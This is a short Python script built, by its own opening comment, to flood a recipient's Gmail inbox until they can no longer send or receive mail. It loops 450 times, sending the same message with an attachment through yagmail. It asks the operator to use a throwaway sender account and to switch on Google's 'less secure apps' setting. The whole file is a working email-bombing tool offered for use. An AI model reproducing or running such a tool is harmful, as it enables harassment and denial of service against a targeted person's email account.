#This program will use for fulfill the space of inbox of Gmail to receiver so that receiver will not send or receive any mail and we recommanded please use a temparary mail ID for this program

#importing the Yagmail library
import yagmail
import os
print("Before using this programe firstly open the browser and login the gmail ID which will used in this programe \n then click this link and allow the less secure apps \n https://myaccount.google.com/lesssecureapps\n\n")
Sender_Gmail_ID = input('Enter the Sender Gmail which is using by this program:--> \n').lower().strip()
Destination_Gmail_ID = input('Enter the Destination Gmail ID:--> \n').lower().strip()
Sender_Password = input('Please Enter the Password Here:---> \n')
Subject = input('Enter the Subject for this Mail:----> \n')
file_name = input('Enter the file name with extainson for attachment:---> \n')
message = ''
Path = os.getcwd()+'\\files\\'+file_name
def execution_program(Sender_Gmail_ID,Sender_Password,Destination_Gmail_ID,Subject,message,Path):
    for var in range(0,450):
        try:
            #initializing the server connection
            yag = yagmail.SMTP(user=Sender_Gmail_ID, password=Sender_Password)
            #sending the email
            yag.send(to=Destination_Gmail_ID, subject=Subject, contents=message,attachments=Path)
            print("Email sent successfully")
        except:
            print("Error, email was not sent")
print('Do you want send the message to destination So type YES otherwise NO:---> \n')
CHOICE = input().lower().strip()
if CHOICE == 'yes':
    message = input('Type Here your message:---> \n')
print('\n\nRunning...')
execution_program(Sender_Gmail_ID,Sender_Password,Destination_Gmail_ID,Subject,message,Path)


print('\nExecution Successful')
